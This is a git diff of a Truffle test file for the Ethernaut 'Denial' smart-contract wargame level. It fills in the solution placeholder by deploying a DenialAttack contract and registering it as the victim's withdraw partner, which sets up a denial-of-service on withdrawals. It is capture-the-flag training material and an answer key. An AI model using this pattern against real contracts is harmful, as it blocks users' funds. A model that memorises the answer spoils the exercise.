@@ -1,5 +1,6 @@
 const DenialFactory = artifacts.require('DenialFactory')
 const Denial = artifacts.require('Denial')
+const DenialAttack = artifacts.require('DenialAttack')
 
 const utils = require('../utils/TestUtils')
 
@@ -19,7 +20,12 @@ contract('Denial', function ([player]) {
       value: web3.utils.toWei('0.001', 'ether'),
     })
 
-    // INSERT YOUR SOLUTION HERE
+    const attacker = await DenialAttack.new(instance.address, {
+      from: player,
+    })
+    await instance.setWithdrawPartner(attacker.address, {
+      from: player,
+    })
 
     const completed = await utils.submitLevelInstance(
       ethernaut,
